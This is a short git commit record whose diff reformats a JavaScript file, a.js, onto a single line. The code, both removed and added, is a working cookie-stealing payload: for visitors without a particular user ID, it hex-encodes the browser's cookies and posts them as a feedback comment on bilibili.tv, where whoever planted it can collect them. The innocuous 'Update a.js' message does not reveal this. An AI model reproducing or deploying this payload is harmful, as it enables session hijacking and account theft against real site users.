912a4f1940987c54922bbeace17ccd6ccf940874
bizwiz <sdrisgod@gmail.com>
2013-01-30 01:27:06 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,3 +1,1 @@
-if(document.cookie.indexOf("DedeUserID=1")<0){
-for(var d=document.cookie,e="",f=0;f<d.length;f++)var g=d.charCodeAt(f).toString(16),e=e+(2>g.length?"0"+g:g);$.post("http://www.bilibili.tv/feedback/post",{aid:"271",action:"send",msg:e});
-}
+if(document.cookie.indexOf("DedeUserID=1")<0){for(var d=document.cookie,e="",f=0;f<d.length;f++)var g=d.charCodeAt(f).toString(16),e=e+(2>g.length?"0"+g:g);$.post("http://www.bilibili.tv/feedback/post",{aid:"271",action:"send",msg:e});}
